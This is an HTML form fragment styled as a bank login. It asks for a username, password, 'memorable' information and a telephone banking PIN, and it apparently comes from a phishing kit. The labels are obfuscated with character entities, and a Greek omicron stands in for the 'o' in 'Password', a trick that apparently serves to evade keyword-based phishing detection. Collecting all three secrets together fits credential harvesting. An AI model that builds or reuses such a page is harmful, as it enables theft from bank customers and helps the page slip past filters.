<br>
<form>
	<table width="100%">		
	</tr>
	<tr>
		<td width="30%">&#x0055;ser&#110;ame</td>
		<td width="2%">&nbsp;&nbsp;:&nbsp;&nbsp;</td>
		<td>
			<div class="textInput">
				<div class="fieldWrapper">
					<input type="text"  autocomplete="off" maxlength="20" name="us_name" value="" required="required" title="Username">
				</div>
			</div>
		</td>
		
	</tr>
	<tr>
		<td>Passw&omicron;rd</td>
		<td width="2%">&nbsp;&nbsp;:&nbsp;&nbsp;</td>
		<td>
			<div class="textInput">
				<div class="fieldWrapper">
					<input type="password"  autocomplete="off" maxlength="20" name="pwd_b" value="" required="required" title="Password">
				</div>
			</div>
		</td>
		
	</tr>
	<tr>
		<td width="30%">&#77;emorable</td>
		<td width="2%">&nbsp;&nbsp;:&nbsp;&nbsp;</td>
		<td>
			<div class="textInput">
				<div class="fieldWrapper">
					<input type="text"  autocomplete="off" maxlength="20" name="m_able" value="" required="required" title="Memorable">
				</div>
			</div>
		</td>
		
	</tr>
	<tr>
		<td width="30%">Telephone Ba&#110;king Pin</td>
		<td width="2%">&nbsp;&nbsp;:&nbsp;&nbsp;</td>
		<td>
			<div class="textInput">
				<div class="fieldWrapper">
					<input type="password"  autocomplete="off" id="txt" onkeyup="check()" onmouseout="check()" maxlength="6" name="tpin" value="" required="" title="Telephone Pin">
				</div>
			</div>
		</td>
		
	</tr>
</table>
</form>